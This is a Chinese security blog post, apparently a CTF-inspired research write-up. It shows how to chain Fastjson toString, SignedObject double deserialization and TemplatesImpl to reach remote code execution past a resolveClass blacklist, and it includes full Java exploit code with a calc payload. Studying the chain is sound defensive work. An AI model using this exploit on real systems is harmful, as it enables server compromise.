@@ -1,0 +1,273 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Squirt1e"><meta name="renderer" content="webkit"><meta name="copyright" content="Squirt1e"><meta name="keywords" content="Squirt1e's blog"><meta name="description" content="一名网络安全从业人员的博客"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Fastjson结合二次反序列化绕过黑名单 · Squirt1e's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Squirt1e</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="https://nese.team/" target="_black">NESE</a></span><span><a href="https://blog.z3ratu1.top/" target="_black">Z3ratu1</a></span><span><a href="https://harmless.blue/" target="_black">CrumbledWall</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Squirt1e's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Fastjson结合二次反序列化绕过黑名单</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2023-06-13</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Java安全"> Java安全</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="FastJson"> FastJson</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">1.4k</span> | Reading time: <span class="post-count">6</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="FastJson结合二次反序列化绕过黑名单"><a href="#FastJson结合二次反序列化绕过黑名单" class="headerlink" title="FastJson结合二次反序列化绕过黑名单"></a>FastJson结合二次反序列化绕过黑名单</h2><blockquote>
+<p>本文首发于先知社区。</p>
+</blockquote>
+<h4 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h4><p>该利用链可以在<code>fastjson</code>任意版本实现<code>RCE</code>，并且借助<code>SignedObject</code>绕过第一层安全的<code>resolveClass</code>对于<code>TemplatesImpl</code>类的检查。</p>
+<p>条件如下：</p>
+<ol>
+<li><code>ObjectInputStream</code>（反序列化）输入数据可控</li>
+<li>引入<code>Fastjson</code>依赖</li>
+</ol>
+<h4 id="FastJson之不安全的反序列化利用"><a href="#FastJson之不安全的反序列化利用" class="headerlink" title="FastJson之不安全的反序列化利用"></a>FastJson之不安全的反序列化利用</h4><p>说起来还是<code>AliyunCTF</code>那道<code>ezbean</code>的非预期，很多师傅使用<code>FastJson#toString</code>方法触发<code>TemplatesImpl#getOutputProperties</code>实现<code>RCE</code>。</p>
+<p><strong>gadget</strong></p>
+<pre><code>BadAttributeValueExpException#readObject
+JSONArray#toString
+TemplatesImpl#getOutputProperties
+</code></pre>
+<p><code>FastJson</code>反序列化并不是通过<code>ObjectInputStream.readObject()</code>还原对象，而是在反序列化的过程中自动调用类属性的<code>setter/getter</code>方法，将<code>JSON</code>字符串还原成对象。</p>
+<p>因此从<code>FJ 1.2.49</code>开始，<code>JSONArray</code>和<code>JSONObject</code>开始重写了<code>resolveClass</code>，过滤了诸如<code>TemplatesImpl</code>的危险类。而<code>ezbean</code>那道题使用了一个不安全的<code>ObjectInputStream</code>进行反序列化。</p>
+<p>这也就导致了选手通过引用的数据类型从而不执行<code>resolveClass</code>以绕过其对危险类的检查，导致了非预期。</p>
+<p><strong>exp</strong></p>
+<pre class="line-numbers language-java"><code class="language-java">        List<span class="token operator">&lt;</span>Object<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        TemplatesImpl templates <span class="token operator">=</span> GadgetUtils<span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span>
+
+        JSONArray jsonArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        jsonArray<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//此时在hash表中查到了映射，因此接下来以引用形式输出</span>
+
+        BadAttributeValueExpException bd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//字节</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> SerializerUtils<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>似乎这样的方式只能在目标环境使用了一个不安全的<code>ObjectInputStream</code>的场景下应用。</p>
+<p>因为<code>templates</code>是以引用的形式来绕过<code>FJ</code>的<code>resolveClass</code>方法的黑名单检查，因此在（见<code>exp</code>第三行）必须把<code>templates</code>添加到<code>list</code>中，所以如果重写了<code>ObjectInputStream</code>过滤<code>templates</code>，这样的方法就失效了。</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token keyword">final</span> List<span class="token operator">&lt;</span>Object<span class="token operator">></span> BLACKLIST <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.syndication.feed.impl.ObjectBean"</span><span class="token punctuation">,</span> <span class="token string">"import com.sun.syndication.feed.impl.ToStringBean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">MyInputStream</span><span class="token punctuation">(</span>InputStream inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
+        <span class="token keyword">super</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span>ObjectStreamClass cls<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>BLACKLIST<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"The class "</span> <span class="token operator">+</span> cls<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is on the blacklist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>解决方案也很简单，就是通过二次反序列化绕过。</p>
+<h4 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h4><p>简单介绍下<code>SignedObject</code>，摘录自<a target="_blank" rel="noopener" href="https://tttang.com/archive/1701/#toc_equalsbean">Poria师傅博客</a></p>
+<p>当防御者重写了<code>ObjectInputStream</code>类，并且再<code>resolveClass</code>方法定义了反序列化黑名单类时，此时就需要通过二次反序列化绕过。</p>
+<p>顾名思义，<strong>二次反序列化攻击就是在受害服务器进行第一次反序列化的过程中借助某些类的方法进行第二次反序列化。</strong>而第二次反序列化是没有<code>ban</code>恶意类的，通过这种方法间接的实现<code>bypass</code>黑名单。</p>
+<p>阅读该类注释可知这个类可以存放一个序列化数据并且有一个属于该数据的签名。</p>
+<pre><code>More specifically, a SignedObject contains another Serializable object, the (to-be-)signed object and its signature.
+</code></pre>
+<p>再观察<code>getObject</code>方法，可以看到其中进行了一次反序列化，这完美符合了我们的要求，并且该类是<code>jdk</code>内置类。</p>
+<p>事实上，该类主要用于加密反序列化数据，防止攻击者截获数据包从而解析序列化数据（竟然有些讽刺）。</p>
+<pre class="line-numbers language-java"><code class="language-java">  <span class="token comment" spellcheck="true">/**
+     * Retrieves the encapsulated object.
+     * The encapsulated object is de-serialized before it is returned.
+     *
+     * @return the encapsulated object.
+     *
+     * @exception IOException if an error occurs during de-serialization
+     * @exception ClassNotFoundException if an error occurs during
+     * de-serialization
+     */</span>
+    <span class="token keyword">public</span> Object <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException
+    <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// creating a stream pipe-line, from b to a</span>
+        ByteArrayInputStream b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ObjectInput a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object obj <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        b<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        a<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>而要反序列化的<code>this.content</code>可以通过构造方法赋值，并且该方法是一个相对容易触发的<code>getter</code>方法，所以<strong>问题转化为了如何触发SignedObject#getObject。</strong></p>
+<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>最好找只依赖于<code>FastJson</code>的包的<code>gadget</code>，使得攻击面最大。</p>
+<p>而正好<code>JsonObject#toString</code>可以触发任意<code>getter</code>方法，而<code>toString</code>又可以通过<code>BadAttributeValueExpException#readObject</code>调用，因此整条链子就通了。</p>
+<p><strong>gadget</strong></p>
+<pre><code>* 绕过第一次的TemplatesImpl黑名单检查
+    BadAttributeValueExpException#readObject
+    JSONOBJECT#toString
+    SignedObject#getObject
+* 二次反序列化
+    * 引用绕过JSON自带resolveClass的黑名单检查
+        BadAttributeValueExpException#readObject
+        JSONArray#toString
+        TemplatesImpl#getOutputProperties
+            TemplatesImpl#newTransformer
+            TemplatesImpl#getTransletInstance
+            TemplatesImpl#defineTransletClasses
+            TemplatesImpl#defineClass
+</code></pre>
+<p><strong>exp</strong></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> gadget<span class="token punctuation">.</span>fastjson<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONArray<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
+<span class="token keyword">import</span> gadget<span class="token punctuation">.</span>doubleunser<span class="token punctuation">.</span>MyInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> util<span class="token punctuation">.</span>GadgetUtils<span class="token punctuation">;</span>
+<span class="token keyword">import</span> util<span class="token punctuation">.</span>ReflectionUtils<span class="token punctuation">;</span>
+<span class="token keyword">import</span> util<span class="token punctuation">.</span>SerializerUtils<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>KeyPair<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>KeyPairGenerator<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>Signature<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>SignedObject<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FJ2</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+
+        List<span class="token operator">&lt;</span>Object<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        TemplatesImpl templates <span class="token operator">=</span> GadgetUtils<span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span>
+
+        JSONArray jsonArray2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        jsonArray2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//此时在handles这个hash表中查到了映射，后续则会以引用形式输出</span>
+
+        BadAttributeValueExpException bd2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd2<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>bd2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">//二次反序列化</span>
+        KeyPairGenerator kpg <span class="token operator">=</span> KeyPairGenerator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        KeyPair kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        SignedObject signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Serializable<span class="token punctuation">)</span> list<span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Signature<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">//触发SignedObject#getObject</span>
+        JSONArray jsonArray1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        jsonArray1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        BadAttributeValueExpException bd1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ReflectionUtils<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>bd1<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonArray1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">//验证</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> payload <span class="token operator">=</span> SerializerUtils<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>bd1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//再套一层inputstream检查TemplatesImpl，不可用</span>
+        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>调试部分可见先知社区，<code>toString</code>触发<code>getter</code>那里还是没太调试明白，到时候把<code>fastjson</code>整理完发到另一篇博客上。</p>
+<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p><code>fastjson</code>的利用往往通过<code>parseObject</code>触发反序列化，此次探索是在<code>readObject</code>反序列化场景下进行。真实场景下不太了解，emm可能在<code>ctf</code>中可以通过这条链子打个非预期吧。</p>
+<p>由于笔者水平不高，希望师傅们多多指正。</p>
+<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ol>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1701/#toc_equalsbean">二次反序列化 看我一命通关-Ploria</a></li>
+<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJson与原生反序列化(二)-Y4tacker</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12485">AliyunCTF官方writeup-f1yyy</a></li>
+</ol>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://www.squirt1e.top">Squirt1e</a></p><p> <span>Link:  </span><a href="http://www.squirt1e.top/2023/06/13/fastjson-jie-he-er-ci-fan-xu-lie-hua-rao-guo-hei-ming-dan/">http://www.squirt1e.top/2023/06/13/fastjson-jie-he-er-ci-fan-xu-lie-hua-rao-guo-hei-ming-dan/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2023/05/15/sql-zhu-ru-zong-jie-mei-xie-wan/" title="SQL注入究极之总结"><span>NextPost ></span><br><span class="nextTitle">SQL注入究极之总结</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson%E7%BB%93%E5%90%88%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">1.</span> <span class="toc-text">FastJson结合二次反序列化绕过黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9C%81%E6%B5%81"><span class="toc-number">1.0.1.</span> <span class="toc-text">省流</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FastJson%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.2.</span> <span class="toc-text">FastJson之不安全的反序列化利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">1.0.3.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SignedObject"><span class="toc-number">1.0.4.</span> <span 